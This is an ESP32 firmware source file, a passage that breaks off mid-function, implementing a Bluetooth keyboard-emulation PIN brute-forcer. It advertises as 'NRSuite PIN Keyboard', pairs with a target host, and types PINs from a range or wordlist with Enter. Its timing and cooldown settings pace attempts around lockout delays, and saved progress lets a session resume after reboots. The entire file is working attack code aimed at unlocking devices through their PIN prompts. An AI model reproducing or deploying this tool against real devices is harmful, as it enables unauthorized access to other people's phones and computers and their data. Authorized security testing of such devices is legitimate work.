#include "ble_pin_bruteforce.h"

#ifdef ENABLE_BLE_HID

#include <Preferences.h>
#include "ble_hid.h"

#if defined(CONFIG_IDF_TARGET_ESP32S3)
#include <FFat.h>
#else
#include <SPIFFS.h>
#endif

BlePinBruteforce blePinBruteforce;

namespace {
constexpr const char* BLE_PIN_WORDLIST_PATH = "/pin_wordlist.txt";

bool blePinFsBegin(bool format) {
#if defined(CONFIG_IDF_TARGET_ESP32S3)
    return FFat.begin(format, "/ffat", 10, "msc_ffat");
#else
    return SPIFFS.begin(format);
#endif
}

void blePinFsEnd() {
#if defined(CONFIG_IDF_TARGET_ESP32S3)
    FFat.end();
#else
    SPIFFS.end();
#endif
}

#if defined(CONFIG_IDF_TARGET_ESP32S3)
#define BLE_PIN_FS_OPEN(path, mode) FFat.open((path), (mode))
#else
#define BLE_PIN_FS_OPEN(path, mode) SPIFFS.open((path), (mode))
#endif

int blePinCharIndex(const String& chars, char c) {
    for (size_t i = 0; i < chars.length(); i++) {
        if (chars[i] == c) return (int)i;
    }
    return -1;
}
}

void BlePinBruteforce::begin(BridgeProtocol& proto) {
    _proto = &proto;
    loadPersistedSession();
    if (_state == BlePinBruteforceState::RUNNING) {
        _state = BlePinBruteforceState::PAUSED;
        _stopReason = "reboot";
        persistSession();
    } else if (_state == BlePinBruteforceState::ADVERTISING) {
        _state = _configured ? BlePinBruteforceState::PAUSED : BlePinBruteforceState::IDLE;
        persistSession();
    }
}

const char* BlePinBruteforce::stateName() const {
    switch (_state) {
        case BlePinBruteforceState::IDLE: return "idle";
        case BlePinBruteforceState::ADVERTISING: return "advertising";
        case BlePinBruteforceState::READY: return "ready";
        case BlePinBruteforceState::RUNNING: return "running";
        case BlePinBruteforceState::PAUSED: return "paused";
        case BlePinBruteforceState::DONE: return "done";
        case BlePinBruteforceState::ERROR_STATE: return "error";
    }
    return "idle";
}

const char* BlePinBruteforce::sourceName() const {
    return _source == BlePinBruteforceSource::RANGE ? "range" : "wordlist";
}

bool BlePinBruteforce::active() const {
    return _ownsBle || _state == BlePinBruteforceState::ADVERTISING ||
           _state == BlePinBruteforceState::READY ||
           _state == BlePinBruteforceState::RUNNING ||
           _state == BlePinBruteforceState::PAUSED;
}

bool BlePinBruteforce::parseConfig(JsonObject args, String& error) {
    const char* mode = args["mode"] | "ble_hid_live";
    if (strcmp(mode, "ble_hid_live") != 0) {
        error = "only ble_hid_live is supported";
        return false;
    }

    const char* source = args["source"] | "range";
    if (strcmp(source, "range") == 0) {
        _source = BlePinBruteforceSource::RANGE;
    } else if (strcmp(source, "wordlist") == 0) {
        _source = BlePinBruteforceSource::WORDLIST;
    } else {
        error = "invalid source";
        return false;
    }

    _pinLength = (uint8_t)(args["pin_length"] | 4);
    _start = String((const char*)(args["start"] | ""));
    _end = String((const char*)(args["end"] | ""));
    _charset = "0123456789";
    _timeoutMs = (uint32_t)(args["timeout_ms"] | 1000);
    _attemptsBeforeTimeout = (uint16_t)(
        args["attempts_before_cooldown"] |
        args["attempts_before_timeout"] |
        0);
    _cooldownMs = (uint32_t)(args["cooldown_ms"] | 30000);
    _interAttemptMs = (uint32_t)(args["inter_attempt_ms"] | 400);
    _typingDelayMs = (uint16_t)(args["typing_delay_ms"] | 20);
    _startDelayMs = (uint16_t)(args["start_delay_ms"] | 500);
    _maxAttempts = (uint32_t)(args["max_attempts"] | 10000);
    _persistEvery = (uint16_t)(args["persist_every"] | 1);
    _autoResume = args["auto_resume"] | true;
    _autoStartOnConnect = args["auto_start_on_connect"] | false;
    _pauseOnDisconnect = args["pause_on_disconnect"] | true;
    _autoReconnect = args["auto_reconnect"] | true;
    _sessionKey = String((const char*)(args["session_key"] | "default"));
    _wordlistFile = String((const char*)(args["wordlist_file"] | BLE_PIN_WORDLIST_PATH));

    if (_wordlistFile.length() == 0) _wordlistFile = BLE_PIN_WORDLIST_PATH;
    if (_pinLength < 4 || _pinLength > 12) {
        error = "pin_length must be 4..12";
        return false;
    }
    if (_sessionKey.length() == 0) _sessionKey = "default";
    if (_timeoutMs < 50) _timeoutMs = 50;
    if (_timeoutMs > 60000) _timeoutMs = 60000;
    if (_interAttemptMs > 60000) _interAttemptMs = 60000;
    if (_typingDelayMs > 500) _typingDelayMs = 500;
    if (_startDelayMs > 10000) _startDelayMs = 10000;
    if (_attemptsBeforeTimeout > 1000) _attemptsBeforeTimeout = 1000;
    if (_cooldownMs > 600000) _cooldownMs = 600000;
    if (_maxAttempts < 1) _maxAttempts = 1;
    if (_maxAttempts > 1000000000UL) _maxAttempts = 1000000000UL;
    if (_persistEvery < 1) _persistEvery = 1;
    if (_persistEvery > 1000) _persistEvery = 1000;
    return true;
}

bool BlePinBruteforce::validateConfig(String& error) {
    if (_source == BlePinBruteforceSource::WORDLIST) {
        if (!wordlistFileExists()) {
            error = "wordlist file not found";
            return false;
        }
        if (!loadWordlist(error)) return false;
        _startIndex = 0;
        _endIndex = _estimatedTotal > 0 ? _estimatedTotal - 1 : 0;
        return true;
    }

    if (_start.length() == 0) {
        _start = "";
        for (uint8_t i = 0; i < _pinLength; i++) _start += _charset[0];
    } else if (_start.length() < _pinLength) {
        while (_start.length() < _pinLength) _start = String(_charset[0]) + _start;
    } else if (_start.length() > _pinLength) {
        error = "start is longer than pin_length";
        return false;
    }

    if (_end.length() == 0) {
        _end = "";
        for (uint8_t i = 0; i < _pinLength; i++) _end += _charset[_charset.length() - 1];
    } else if (_end.length() < _pinLength) {
        while (_end.length() < _pinLength) _end = String(_charset[0]) + _end;
    } else if (_end.length() > _pinLength) {
        error = "end is longer than pin_length";
        return false;
    }

    auto toIndex = [&](const String& value, uint64_t& out) -> bool {
        uint64_t result = 0;
        const uint64_t base = _charset.length();
        for (size_t i = 0; i < value.length(); i++) {
            const int idx = blePinCharIndex(_charset, value[i]);
            if (idx < 0) {
                error = "range value contains a non-digit character";
                return false;
            }
            if (result > (UINT64_MAX - (uint64_t)idx) / base) {
                error = "range value overflows 64-bit index";
                return false;
            }
            result = (result * base) + (uint64_t)idx;
        }
        out = result;
        return true;
    };

    uint64_t startIndex = 0;
    uint64_t endIndex = 0;
    if (!toIndex(_start, startIndex)) return false;
    if (!toIndex(_end, endIndex)) return false;
    if (endIndex < startIndex) {
        error = "end is before start";
        return false;
    }

    const uint64_t rangeCount = (endIndex - startIndex) + 1ULL;
    if (rangeCount > 0xFFFFFFFFUL) {
        error = "range exceeds supported attempt count";
        return false;
    }

    _startIndex = startIndex;
    _endIndex = endIndex;
    _estimatedTotal = rangeCount;
    return true;
}

bool BlePinBruteforce::loadWordlist(String& error) {
    error = "";
    _wordlist = "";
    if (!buildWordlistLines(error)) return false;
    uint32_t lines = 0;
    int start = 0;
    while (start <= (int)_wordlist.length()) {
        int nl = _wordlist.indexOf('\n', start);
        String line = (nl < 0) ? _wordlist.substring(start) : _wordlist.substring(start, nl);
        if (line.length() > 0) lines++;
        if (nl < 0) break;
        start = nl + 1;
    }
    _estimatedTotal = lines;
    return true;
}

bool BlePinBruteforce::buildWordlistLines(String& error) {
    String content;
    if (!readWordlistFile(content)) {
        error = "could not read wordlist file";
        return false;
    }
    content.replace("\r", "");

    uint32_t lines = 0;
    String normalized;
    normalized.reserve(content.length());
    int start = 0;
    while (start <= (int)content.length()) {
        int nl = content.indexOf('\n', start);
        String line = (nl < 0) ? content.substring(start) : content.substring(start, nl);
        line.trim();
        if (line.length() > 0) {
            if (line.length() > 64) {
                error = "wordlist line exceeds 64 characters";
                return false;
            }
            lines++;
            if (lines > MAX_WORDLIST_LINES) {
                error = "wordlist exceeds 1000 lines";
                return false;
            }
            normalized += line;
            normalized += '\n';
        }
        if (nl < 0) break;
        start = nl + 1;
    }
    if (lines == 0) {
        error = "wordlist is empty";
        return false;
    }
    if (normalized.length() > MAX_WORDLIST_BYTES) {
        error = "wordlist exceeds 16 KB";
        return false;
    }
    _wordlist = normalized;
    return true;
}

bool BlePinBruteforce::readLineFromWordlist(uint32_t index, String& out) const {
    uint32_t line = 0;
    int start = 0;
    while (start <= (int)_wordlist.length()) {
        int nl = _wordlist.indexOf('\n', start);
        String current = (nl < 0) ? _wordlist.substring(start) : _wordlist.substring(start, nl);
        if (line == index) {
            out = current;
            return true;
        }
        if (nl < 0) break;
        line++;
        start = nl + 1;
    }
    return false;
}

bool BlePinBruteforce::nextRangePinAt(uint64_t value, String& out) const {
    char buffer[13] = {0};
    const uint32_t base = _charset.length();
    for (int i = _pinLength - 1; i >= 0; i--) {
        buffer[i] = _charset[value % base];
        value /= base;
    }
    out = String(buffer);
    return true;
}

bool BlePinBruteforce::pinAtAttemptIndex(uint32_t attemptIndex, String& out) const {
    if (_source == BlePinBruteforceSource::WORDLIST) {
        return readLineFromWordlist(attemptIndex, out);
    }
    if ((uint64_t)attemptIndex >= _estimatedTotal) return false;
    const uint64_t absolute = _startIndex + (uint64_t)attemptIndex;
    if (absolute > _endIndex) return false;
    return nextRangePinAt(absolute, out);
}

uint32_t BlePinBruteforce::effectiveTotal() const {
    uint64_t total = _estimatedTotal;
    if (_maxAttempts > 0 && _maxAttempts < total) total = _maxAttempts;
    if (total > 0xFFFFFFFFUL) total = 0xFFFFFFFFUL;
    return (uint32_t)total;
}

void BlePinBruteforce::setLastPinFromAttemptCount() {
    if (_attemptsTotal == 0) {
        _lastPin = "";
        return;
    }
    String pin;
    if (pinAtAttemptIndex(_attemptsTotal - 1, pin)) {
        _lastPin = pin;
    } else {
        _lastPin = "";
    }
}

void BlePinBruteforce::startRunning(const char* reason) {
    _state = BlePinBruteforceState::RUNNING;
    _stopReason = "";
    _lastError = "";
    _updatedAt = millis();
    if (_startedAt == 0) _startedAt = millis();
    BleHid::releaseAll();
    _nextAttemptAtMs = millis() + _startDelayMs;
    _cooldownUntilMs = 0;
    persistSession();
    emitStatus(reason ? reason : "running");
}

void BlePinBruteforce::pauseInternal(const char* reason) {
    if (_state != BlePinBruteforceState::RUNNING) return;
    _state = BlePinBruteforceState::PAUSED;
    _stopReason = reason ? reason : "paused";
    _updatedAt = millis();
    _nextAttemptAtMs = 0;
    _cooldownUntilMs = 0;
    BleHid::releaseAll();
    persistSession();
    emitStatus("paused");
}

void BlePinBruteforce::finish(const char* reason) {
    _state = BlePinBruteforceState::DONE;
    _stopReason = reason ? reason : "done";
    _updatedAt = millis();
    _nextAttemptAtMs = 0;
    _cooldownUntilMs = 0;
    BleHid::releaseAll();
    persistSession();
    emitDone();
}

bool BlePinBruteforce::advertiseStart(JsonObject args, String& error) {
    if (_ownsBle && (BleHid::isAdvertising() || BleHid::isConnected())) {
        _state = BleHid::isConnected() ? BlePinBruteforceState::READY : BlePinBruteforceState::ADVERTISING;
        emitStatus("advertising");
        return true;
    }
    if (BleHid::isAdvertising() || BleHid::isConnected()) {
        error = "another BLE HID session is active";
        return false;
    }

    const char* name = args["name"] | "NRSuite PIN Keyboard";
    _deviceName = String(name);
    if (_deviceName.length() == 0) _deviceName = "NRSuite PIN Keyboard";
    _autoReconnect = args["auto_reconnect"] | _autoReconnect;

    BleHid::begin(_deviceName);
    if (!BleHid::isAdvertising() && !BleHid::isConnected()) {
        error = "failed to start BLE HID advertising";
        return false;
    }

    _ownsBle = true;
    _lastBleAdvertising = BleHid::isAdvertising();
    _lastBleConnected = BleHid::isConnected();
    _lastBonded = BleHid::isBonded();
    _lastPeer = BleHid::peerAddress();
    _state = _lastBleConnected ? BlePinBruteforceState::READY : BlePinBruteforceState::ADVERTISING;
    _updatedAt = millis();
    persistSession();
    emitConnection();
    emitStatus("advertising_started");
    return true;
}

bool BlePinBruteforce::advertiseStop(String& error) {
    (void)error;
    if (_state == BlePinBruteforceState::RUNNING) {
        pauseInternal("advertising_stopped");
    }
    if (_ownsBle) {
        BleHid::releaseAll();
        BleHid::end();
        _ownsBle = false;
    }
    if (_state == BlePinBruteforceState::ADVERTISING || _state == BlePinBruteforceState::READY) {
        _state = _configured ? BlePinBruteforceState::PAUSED : BlePinBruteforceState::IDLE;
    }
    _nextAttemptAtMs = 0;
    _lastBleAdvertising = false;
    _lastBleConnected = false;
    _lastPeer = "";
    _updatedAt = millis();
    persistSession();
    emitConnection();
    emitStatus("advertising_stopped");
    return true;
}

bool BlePinBruteforce::start(JsonObject args, String& error) {
    if (!_ownsBle || !BleHid::isConnected()) {
        error = "BLE host not connected; start advertising and pair first";
        return false;
    }

    const bool hadSession = _configured;
    const bool wasFinished = _state == BlePinBruteforceState::DONE ||
                             _state == BlePinBruteforceState::ERROR_STATE;
    const String previousKey = _sessionKey;
    const BlePinBruteforceSource previousSource = _source;
    const uint32_t savedAttemptsTotal = _attemptsTotal;
    const uint32_t savedAttemptsInCycle = _attemptsInCycle;
    const uint64_t savedStartIndex = _startIndex;
    const uint64_t savedEndIndex = _endIndex;
    const uint64_t savedEstimatedTotal = _estimatedTotal;
    const String savedLastPin = _lastPin;
    const uint32_t savedStartedAt = _startedAt;
    const String savedStart = _start;
    const String savedEnd = _end;
    const uint8_t savedPinLength = _pinLength;

    BleHid::releaseAll();
    if (!parseConfig(args, error)) return false;
    if (!validateConfig(error)) return false;

    const bool resumeSaved = hadSession && !wasFinished && _autoResume &&
                             previousKey == _sessionKey &&
                             previousSource == _source &&
                             savedAttemptsTotal > 0;
    if (resumeSaved) {
        _attemptsTotal = savedAttemptsTotal;
        _attemptsInCycle = savedAttemptsInCycle;
        _startIndex = savedStartIndex;
        _endIndex = savedEndIndex;
        _estimatedTotal = savedEstimatedTotal;
        _lastPin = savedLastPin;
        _startedAt = savedStartedAt ? savedStartedAt : millis();
        _start = savedStart;
        _end = savedEnd;
        _pinLength = savedPinLength;
    } else {
        _attemptsTotal = 0;
        _attemptsInCycle = 0;
        _lastPin = "";
        _startedAt = millis();
    }

    _configured = true;
    _stopReason = "";
    _lastError = "";
    _updatedAt = millis();
    persistSession();
    startRunning(resumeSaved ? "resumed" : "started");
    return true;
}

bool BlePinBruteforce::pause(String& error) {
    if (_state == BlePinBruteforceState::PAUSED) return true;
    if (_state != BlePinBruteforceState::RUNNING) {
        error = "session is not running";
        return false;
    }
    pauseInternal("paused");
    return true;
}

bool BlePinBruteforce::resume(String& error) {
    if (!_ownsBle || !BleHid::isConnected()) {
        error = "BLE host not connected";
        return false;
    }
    if (_state != BlePinBruteforceState::PAUSED) {
        error = "session is not paused";
        return false;
    }
    if (!_configured) {
        error = "no configured session";
        return false;
    }
    if (_source == BlePinBruteforceSource::WORDLIST && !loadWordlist(error)) {
        return false;
    }
    startRunning("resumed");
    return true;
}

bool BlePinBruteforce::stop(String& error) {
    (void)error;
    if (_state == BlePinBruteforceState::RUNNING ||
        _state == BlePinBruteforceState::PAUSED ||
        _state == BlePinBruteforceState::READY) {
        _state = BlePinBruteforceState::DONE;
        _stopReason = "stopped";
        _nextAttemptAtMs = 0;
        _updatedAt = millis();
        BleHid::releaseAll();
        persistSession();
        emitDone();
        emitStatus("stopped");
        return true;
    }
    return true;
}

bool BlePinBruteforce::nextAttempt(String& error) {
    if (!_configured) {
        error = "no configured session";
        return false;
    }
    if (_state == BlePinBruteforceState::DONE || _state == BlePinBruteforceState::ERROR_STATE) {
        error = "session is finished";
        return false;
    }
    const uint32_t total = effectiveTotal();
    if (total == 0 || _attemptsTotal >= total) {
        error = "end of range";
        return false;
    }

    String skipped;
    if (!pinAtAttemptIndex(_attemptsTotal, skipped)) {
        error = "could not build skipped PIN";
        return false;
    }
    _lastPin = skipped;
    _attemptsTotal++;
    _attemptsInCycle++;
    _updatedAt = millis();
    if (_state == BlePinBruteforceState::RUNNING) {
        _nextAttemptAtMs = millis();
    }
    emitAttempt(true);
    persistProgress();
    if (_persistEvery == 1 || (_attemptsTotal % _persistEvery) == 0) persistSession();
    if (_maxAttempts > 0 && _attemptsTotal >= _maxAttempts) {
        finish("max_attempts");
    } else {
        emitStatus("skipped");
    }
    return true;
}

bool BlePinBruteforce::previousAttempt(String& error) {
    if (!_configured) {
        error = "no configured session";
        return false;
    }
    if (_attemptsTotal == 0) {
        error = "already at the first PIN";
        return false;
    }
    if (_state == BlePinBruteforceState::RUNNING) {
        pauseInternal("previous");
    } else if (_state == BlePinBruteforceState::DONE ||
               _state == BlePinBruteforceState::ERROR_STATE) {
        _state = BlePinBruteforceState::PAUSED;
        _lastError = "";
        _stopReason = "previous";
    }
    _attemptsTotal--;
    if (_attemptsInCycle > 0) _attemptsInCycle--;
    _updatedAt = millis();
    _nextAttemptAtMs = 0;
    setLastPinFromAttemptCount();
    persistProgress();
    persistSession();
    emitStatus("previous");
    return true;
}

bool BlePinBruteforce::clear(bool clearWordlist, String& error) {
    (void)error;
    BleHid::releaseAll();
    _configured = false;
    _state = _ownsBle
        ? (BleHid::isConnected() ? BlePinBruteforceState::READY : BlePinBruteforceState::ADVERTISING)
        : BlePinBruteforceState::IDLE;
    _source = BlePinBruteforceSource::RANGE;
    _start = "";
    _end = "";
    _pinLength = 4;
    _attemptsTotal = 0;
    _attemptsInCycle = 0;
    _startIndex = 0;
    _endIndex = 0;
    _estimatedTotal = 0;
    _lastPin = "";
    _lastError = "";
    _startedAt = 0;
    _updatedAt = 0;
    _nextAttemptAtMs = 0;
    _stopReason = "";
    _wordlist = "";
    clearPersistedSession();
    if (clearWordlist) removeWordlistFile();
    emitStatus("cleared");
    return true;
}

bool BlePinBruteforce::forgetBond(String& error) {
    (void)error;
    if (!_ownsBle) {
        error = "BLE HID session is not active";
        return false;
    }
    BleHid::clearBonds();
    _lastBonded = false;
    _updatedAt = millis();
    persistSession();
    emitStatus("bond_cleared");
    return true;
}

bool BlePinBruteforce::disconnectPeer(String& error) {
    if (!_ownsBle) {
        error = "BLE HID session is not active";
        return false;
    }
    if (_state == BlePinBruteforceState::RUNNING) {
        pauseInternal("ble_disconnect");
    }
    const bool ok = BleHid::disconnectPeer();
    if (!ok) {
        error = "no BLE peer connected";
        return false;
    }
    _updatedAt = millis();
    emitStatus("disconnect_requested");
    return true;
}

void BlePinBruteforce::onBleEnded() {
    _ownsBle = false;
    if (_state == BlePinBruteforceState::RUNNING) {
        _state = BlePinBruteforceState::PAUSED;
        _stopReason = "ble_stopped";
        BleHid::releaseAll();
    } else if (_state == BlePinBruteforceState::ADVERTISING ||
               _state == BlePinBruteforceState::READY) {
        _state = _configured ? BlePinBruteforceState::PAUSED : BlePinBruteforceState::IDLE;
    }
    _lastBleAdvertising = false;
    _lastBleConnected = false;
    _lastPeer = "";
    _updatedAt = millis();
    persistSession();
    emitStatus("ble_stopped");
}

void BlePinBruteforce::updateBleState() {
    const bool connected = BleHid::isConnected();
    const bool advertising = BleHid::isAdvertising();
    const bool bonded = BleHid::isBonded();
    const String peer = BleHid::peerAddress();

    bool changed = false;
    if (connected != _lastBleConnected) {
        changed = true;
        if (connected) {
            if (_state == BlePinBruteforceState::ADVERTISING ||
                _state == BlePinBruteforceState::IDLE) {
                _state = BlePinBruteforceState::READY;
            }
            if (_autoStartOnConnect && _configured &&
                _state == BlePinBruteforceState::PAUSED &&
                _stopReason == "ble_disconnect") {
                startRunning("auto_reconnect");
            }
        } else {
            if (_state == BlePinBruteforceState::RUNNING) {
                if (_pauseOnDisconnect) {
                    pauseInternal("ble_disconnect");
                } else {
                    _state = BlePinBruteforceState::ERROR_STATE;
                    _lastError = "BLE disconnected";
                    _stopReason = "ble_disconnect";
                    _nextAttemptAtMs = 0;
                    _updatedAt = millis();
                    BleHid::releaseAll();
                    persistSession();
                    emitError("ble_disconnect", "BLE disconnected");
                }
            }
            if (!_autoReconnect && _ownsBle) {
                BleHid::end();
                _ownsBle = false;
            }
        }
    }

    if (advertising != _lastBleAdvertising) changed = true;
    if (peer != _lastPeer || bonded != _lastBonded) changed = true;

    _lastBleConnected = connected;
    _lastBleAdvertising = advertising;
    _lastBonded = bonded;
    _lastPeer = peer;

    if (changed) {
        emitConnection();
        emitStatus("ble_state");
    }
}

void BlePinBruteforce::update() {
    if (!_proto) return;
    updateBleState();

    if (_state != BlePinBruteforceState::RUNNING) return;
    if (!BleHid::isConnected()) {
        if (_pauseOnDisconnect) {
            pauseInternal("ble_disconnect");
        } else {
            _state = BlePinBruteforceState::ERROR_STATE;
            _lastError = "BLE disconnected";
            _stopReason = "ble_disconnect";
            _updatedAt = millis();
            BleHid::releaseAll();
            persistSession();
            emitError("ble_disconnect", "BLE disconnected");
            emitStatus("error");
        }
        return;
    }

    const uint32_t now = millis();
    if (_nextAttemptAtMs != 0 && now < _nextAttemptAtMs) return;

    if (_maxAttempts > 0 && _attemptsTotal >= _maxAttempts) {
        finish("max_attempts");
        return;
    }
    if (_attemptsTotal >= effectiveTotal()) {
        finish("exhausted");
        return;
    }

    String pin;
    if (!pinAtAttemptIndex(_attemptsTotal, pin)) {
        finish("exhausted");
        return;
    }

    const size_t written = BleHid::typeTextSlow(pin, _typingDelayMs);
    if (written != pin.length()) {
        _state = BlePinBruteforceState::PAUSED;
        _lastError = "BLE HID send failed";
        _stopReason = "send_failed";
        _updatedAt = millis();
        _nextAttemptAtMs = 0;
        BleHid::releaseAll();
        persistSession();
        emitError("ble_send", "BLE HID send failed");
        emitStatus("paused");
        return;
    }

    delay(50);
    BleHid::tapKey("ENTER");

    _lastPin = pin;
    _attemptsTotal++;
    _attemptsInCycle++;
    _updatedAt = millis();
    emitAttempt(false);

    bool cooldown = false;
    if (_attemptsBeforeTimeout > 0 && _attemptsInCycle >= _attemptsBeforeTimeout) {
        _attemptsInCycle = 0;
        cooldown = true;
    }
    _nextAttemptAtMs = now + _timeoutMs + _interAttemptMs + (cooldown ? _cooldownMs : 0);
    _cooldownUntilMs = cooldown ? now + _timeoutMs + _cooldownMs + _interAttemptMs : 0;

    persistProgress();
    if (_persistEvery == 1 || (_attemptsTotal % _persistEvery) == 0 || cooldown) {
        persistSession();
    }
}

void BlePinBruteforce::status(JsonDocument& doc) {
    doc["state"] = stateName();
    doc["mode"] = "ble_hid_live";
    doc["source"] = sourceName();
    doc["configured"] = _configured;
    doc["device_name"] = _deviceName;

    const bool connected = BleHid::isConnected();
    const bool advertising = BleHid::isAdvertising();
    doc["ble_connected"] = connected;
    doc["ble_advertising"] = advertising;
    doc["ble_state"] = connected ? "connected" : (advertising ? "advertising" : "stopped");
    doc["bonded"] = BleHid::isBonded();
    doc["peer"] = BleHid::peerAddress();
    doc["owns_ble"] = _ownsBle;

    doc["auto_reconnect"] = _autoReconnect;
    doc["auto_start_on_connect"] = _autoStartOnConnect;
    doc["pause_on_disconnect"] = _pauseOnDisconnect;

    doc["pin_length"] = _pinLength;
    doc["start"] = _start;
    doc["end"] = _end;
    doc["charset"] = _charset;
    doc["timeout_ms"] = _timeoutMs;
    doc["attempts_before_cooldown"] = _attemptsBeforeTimeout;
    doc["attempts_before_timeout"] = _attemptsBeforeTimeout;
    doc["cooldown_ms"] = _cooldownMs;
    doc["inter_attempt_ms"] = _interAttemptMs;
    doc["typing_delay_ms"] = _typingDelayMs;
    doc["start_delay_ms"] = _startDelayMs;
    doc["max_attempts"] = _maxAttempts;
    doc["persist_every"] = _persistEvery;
    doc["auto_resume"] = _autoResume;
    doc["session_key"] = _sessionKey;
    doc["estimated_total"] = _estimatedTotal;

    const uint32_t total = effectiveTotal();
    const uint32_t progress = (total == 0) ? 0 : (uint32_t)((uint64_t)_attemptsTotal * 100ULL / total);
    doc["progress_percent"] = progress > 100 ? 100 : progress;
    doc["stop_reason"] = _stopReason;
    doc["start_index"] = (uint32_t)_startIndex;
    doc["end_index"] = (uint32_t)_endIndex;
    doc["current_sequence"] = _attemptsTotal;
    doc["attempts_total"] = _attemptsTotal;
    doc["attempts_in_cycle"] = _attemptsInCycle;
    const uint32_t nowMs = millis();
    doc["cooldown_active"] = _cooldownUntilMs > nowMs;
    doc["cooldown_remaining_ms"] = _cooldownUntilMs > nowMs ? (_cooldownUntilMs - nowMs) : 0;
    doc["last_pin"] = _lastPin;
    doc["last_error"] = _lastError;
    doc["started_at"] = _startedAt;
    doc["updated_at"] = _updatedAt;
    doc["wordlist_file"] = _wordlistFile;
    doc["wordlist_lines"] = 0;
    doc["wordlist_bytes"] = 0;
    doc["wordlist_present"] = false;

    if (_source == BlePinBruteforceSource::WORDLIST) {
        String content;
        if (readWordlistFile(content)) {
            uint32_t lines = 0;
            int lineStart = 0;
            while (lineStart <= (int)content.length()) {
                int nl = content.indexOf('\n', lineStart);
                String line = (nl < 0) ? content.substring(lineStart) : content.substring(lineStart, nl);
                line.trim();
                if (line.length() > 0) lines++;
                if (nl < 0) break;
                lineStart = nl + 1;
            }
            doc["wordlist_lines"] = lines;
            doc["wordlist_bytes"] = content.length();
            doc["wordlist_present"] = true;
        }
    }

    String nextPin;
    if (_configured && _attemptsTotal < effectiveTotal() &&
        pinAtAttemptIndex(_attemptsTotal, nextPin)) {
        doc["next_pin"] = nextPin;
    } else {
        doc["next_pin"] = "";
    }

    Preferences prefs;
    if (prefs.begin(NVS_NAMESPACE, true)) {
        doc["persisted_in_nvs"] = prefs.isKey("state");
        prefs.end();
    } else {
        doc["persisted_in_nvs"] = false;
    }
}

void BlePinBruteforce::emitStatus(const char* reason) {
    if (!_proto) return;
    JsonDocument doc;
    status(doc);
    if (reason) doc["reason"] = reason;
    _proto->sendEvent("ble_pin_session_status", doc);
}

void BlePinBruteforce::emitAttempt(bool skipped) {
    if (!_proto) return;
    JsonDocument doc;
    doc["mode"] = "ble_hid_live";
    doc["source"] = sourceName();
    doc["pin"] = _lastPin;
    doc["current_sequence"] = _attemptsTotal;
    doc["attempts_total"] = _attemptsTotal;
    doc["attempts_in_cycle"] = _attemptsInCycle;
    doc["estimated_total"] = _estimatedTotal;
    doc["max_attempts"] = _maxAttempts;
    doc["skipped"] = skipped;
    doc["started_at"] = _startedAt;
    doc["updated_at"] = _updatedAt;
    _proto->sendEvent("ble_pin_attempt", doc);
}

void BlePinBruteforce::emitDone() {
    if (!_proto) return;
    JsonDocument doc;
    doc["mode"] = "ble_hid_live";
    doc["source"] = sourceName();
    doc["attempts_total"] = _attemptsTotal;
    doc["last_pin"] = _lastPin;
    doc["stop_reason"] = _stopReason.length() ? _stopReason : "unknown";
    doc["started_at"] = _startedAt;
    doc["updated_at"] = _updatedAt;
    _proto->sendEvent("ble_pin_done", doc);
    emitStatus("done");
}

void BlePinBruteforce::emitError(const char* code, const char* message) {
    if (!_proto) return;
    JsonDocument doc;
    doc["code"] = code ? code : "error";
    doc["msg"] = message ? message : "";
    _proto->sendEvent("ble_pin_error", doc);
}

void BlePinBruteforce::emitConnection() {
    if (!_proto) return;
    JsonDocument doc;
    doc["state"] = stateName();
    doc["ble_connected"] = BleHid::isConnected();
    doc["ble_advertising"] = BleHid::isAdvertising();
    doc["bonded"] = BleHid::isBonded();
    doc["peer"] = BleHid::peerAddress();
    doc["auto_reconnect"] = _autoReconnect;
    _proto->sendEvent("ble_pin_connection", doc);
}

void BlePinBruteforce::persistSession() {
    Preferences prefs;
    if (!prefs.begin(NVS_NAMESPACE, false)) return;
    prefs.putUChar("state", (uint8_t)_state);
    prefs.putUChar("source", (uint8_t)_source);
    prefs.putBool("configured", _configured);
    prefs.putString("device_name", _deviceName);
    prefs.putBool("auto_reconnect", _autoReconnect);
    prefs.putBool("auto_start", _autoStartOnConnect);
    prefs.putBool("pause_disconnect", _pauseOnDisconnect);
    prefs.putUChar("pin_len", _pinLength);
    prefs.putString("start", _start);
    prefs.putString("end", _end);
    prefs.putUInt("timeout", _timeoutMs);
    prefs.putUShort("att_before", _attemptsBeforeTimeout);
    prefs.putUInt("cooldown", _cooldownMs);
    prefs.putUInt("inter", _interAttemptMs);
    prefs.putUShort("typing_delay", _typingDelayMs);
    prefs.putUShort("start_delay", _startDelayMs);
    prefs.putUInt("max_attempts", _maxAttempts);
    prefs.putUShort("persist_every", _persistEvery);
    prefs.putBool("auto_resume", _autoResume);
    prefs.putString("session_key", _sessionKey);
    prefs.putString("wordlist_file", _wordlistFile);
    prefs.putULong64("start_index", _startIndex);
    prefs.putULong64("end_index", _endIndex);
    prefs.putUInt("attempts_total", _attemptsTotal);
    prefs.putUInt("attempts_cycle", _attemptsInCycle);
    prefs.putULong64("estimated_total", _estimatedTotal);
    prefs.putString("stop_reason", _stopReason);
    prefs.putString("last_pin", _lastPin);
    prefs.putString("last_error", _lastError);
    prefs.putUInt("cooldown_until", _cooldownUntilMs);
    prefs.putUInt("started_at", _startedAt);
    prefs.putUInt("updated_at", _updatedAt);
    prefs.end();
}

void BlePinBruteforce::persistProgress() {
    Preferences prefs;
    if (!prefs.begin(NVS_NAMESPACE, false)) return;
    prefs.putUChar("state", (uint8_t)_state);
    prefs.putUInt("attempts_total", _attemptsTotal);
    prefs.putUInt("attempts_cycle", _attemptsInCycle);
    prefs.putString("last_pin", _lastPin);
    prefs.putString("stop_reason", _stopReason);
    prefs.putUInt("cooldown_until", _cooldownUntilMs);
    prefs.putUInt("updated_at", _updatedAt);
    prefs.end();
}

void BlePinBruteforce::loadPersistedSession() {
    Preferences prefs;
    if (!prefs.begin(NVS_NAMESPACE, true)) return;
    if (!prefs.isKey("state")) {
        prefs.end();
        return;
    }
    _state = (BlePinBruteforceState)prefs.getUChar("state", (uint8_t)BlePinBruteforceState::IDLE);
    _source = (BlePinBruteforceSource)prefs.getUChar("source", (uint8_t)BlePinBruteforceSource::RANGE);
    _configured = prefs.getBool("configured", false);
    _deviceName = prefs.getString("device_name", "NRSuite PIN Keyboard");
    _autoReconnect = prefs.getBool("auto_reconnect", true);
    _autoStartOnConnect = prefs.getBool("auto_start", false);
    _pauseOnDisconnect = prefs.getBool("pause_disconnect", true);
    _pinLength = prefs.getUChar("pin_len", 4);
    _start = prefs.getString("start", "");
    _end = prefs.getString("end", "");
    _timeoutMs = prefs.getUInt("timeout", 1000);
